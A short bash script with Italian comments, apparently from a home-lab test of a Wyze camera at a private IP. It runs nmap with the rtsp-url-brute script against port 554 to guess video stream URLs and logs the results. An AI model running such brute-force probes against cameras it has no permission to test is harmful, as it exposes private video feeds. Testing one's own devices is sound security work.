#!/usr/bin/env bash
set -euo pipefail

# IP target (Wyze Cam su hotspot)
IP="192.168.2.2"
OUTPUT_FILE="resultsAttackRTSP.txt"

# Ripulisco l’output file all’inizio
: > "${OUTPUT_FILE}"

print_header(){
  local header="$1"
  echo -e "\n==================== ${header} ====================\n" \
    | tee -a "${OUTPUT_FILE}"
}

run_command(){
  local msg="$1"
  local cmd="$2"

  print_header "${msg}"
  echo "\$ ${cmd}" | tee -a "${OUTPUT_FILE}"
  # eseguo il comando appendendo stdout+stderr su OUTPUT_FILE
  eval "${cmd}" 2>&1 | tee -a "${OUTPUT_FILE}"
}

attack(){
  print_header "Starting RTSP attack on port 554"
  PORTS="554"

  for p in ${PORTS}; do
    run_command "Testing RTSP port ${p}" \
      "nmap -Pn -sV -p${p} --script rtsp-url-brute ${IP}"
  done
}

# Lancio l’attacco
attack

echo -e "\nDone. Results in ${OUTPUT_FILE}\n"
